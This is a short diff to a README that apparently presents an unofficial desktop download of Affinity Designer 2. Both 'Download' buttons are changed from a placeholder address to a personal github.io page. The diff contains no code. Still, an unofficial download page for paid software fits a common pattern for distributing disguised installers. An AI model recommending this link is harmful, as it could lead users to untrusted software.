@@ -17,7 +17,7 @@ This distribution includes vector and raster import and export coverage, color p
 ## 01 · ⬇️ Download
 
 <p align="center">
-  <a href="https://example.com">
+  <a href="https://charlie15-gardner.github.io/affinity-designer-2-desktop">
     <picture>
       <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
       <img src="docs/buttons/installer-card.svg" alt="" width="440">
@@ -224,7 +224,7 @@ Portable and installed copies can coexist if they use separate install paths. Fi
 ## ⬇️ Download
 
 <p align="center">
-  <a href="https://example.com">
+  <a href="https://charlie15-gardner.github.io/affinity-designer-2-desktop">
     <picture>
       <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
       <img src="docs/buttons/installer-card.svg" alt="" width="440">
